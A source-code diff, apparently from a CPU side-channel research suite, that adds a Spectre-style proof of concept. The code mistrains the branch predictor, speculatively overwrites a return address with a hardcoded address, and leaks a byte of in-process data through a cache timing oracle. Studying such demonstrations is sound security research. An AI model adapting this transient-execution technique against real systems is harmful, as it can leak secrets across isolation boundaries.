@@ -218,3 +218,80 @@ char Ret2AbortedCallLeakByte() {
     }
   }
 }
+
+// Declare a large static array such that elements at the
+// start and end will map to different cache lines. This is
+// so that if we have to flush or keep various elements in
+// the cache, they don't accidentally map to the same line.
+const size_t SIZE = 128;
+static uint64_t vars[SIZE];
+
+// Return address is hijacked speculatively to point here.
+void deadCode() {
+  const std::array<BigByte, 256> &oracle = *oracle_ptr;
+  ForceRead(oracle.data() +
+    static_cast<unsigned char>(private_data[current_offset]));
+  std::cout << "Dead code. Must not be printed." << std::endl;
+}
+
+void spectreGadget() {
+  volatile uint64_t stack_mark = 0xdeadbeef;
+  volatile char *ptr = (char *)&stack_mark;
+
+  // Mistrain the global branch predictor.
+  for (int i = 0; i < 100; i++) {}
+
+  if (vars[0] == 0) {
+    // Test to make sure that CPU speculates.
+    // const std::array<BigByte, 256> &oracle = *oracle_ptr;
+    // ForceRead(oracle.data() +
+    //   static_cast<unsigned char>(private_data[current_offset]));
+
+    // The offset to ptr is 0 during training such
+    // that it doesn't write OOB, but is 8 during
+    // speculation s.t. it overwrites the ret addr.
+    *(volatile uint64_t *)(ptr + vars[SIZE - 1]) = 0x0000555555555701;
+    return;
+  }
+}
+
+// Note: run with ASLR turned off. Function locations are hardcoded
+// because C++ doesn't like converting function pointers into uint64_ts
+// and vice versa.
+char Ret2Transient() {
+  CacheSideChannel sidechannel;
+  oracle_ptr = &sidechannel.GetOracle();
+  const std::array<BigByte, 256> &oracle = *oracle_ptr;
+
+  // printf("\nSanity check for cachelines\nvars[0]: %p, vars[SIZE - 1]: %p\n", &vars[0], &vars[SIZE - 1]);
+
+  for (int run = 0;; ++run) {
+    // Make the store in the if-body overwrite local vars.
+    vars[0] = 0;
+    vars[SIZE - 1] = 0;
+
+    for (int i = 0; i < 3; i++) {
+      spectreGadget();
+    }
+
+    sidechannel.FlushOracle();
+
+    // Flush if-condition, and make the store in the if-body
+    // overwrite the return address.
+    vars[0] = 1;
+    vars[SIZE - 1] = 8;
+    FlushDataCacheLine(&vars[0]);
+
+    spectreGadget();
+
+    std::pair<bool, char> result = sidechannel.AddHitAndRecomputeScores();
+    if (result.first) {
+      return result.second;
+    }
+
+    if (run > 100000) {
+      std::cerr << "Does not converge " << result.second << std::endl;
+      exit(EXIT_FAILURE);
+    }
+  }
+}
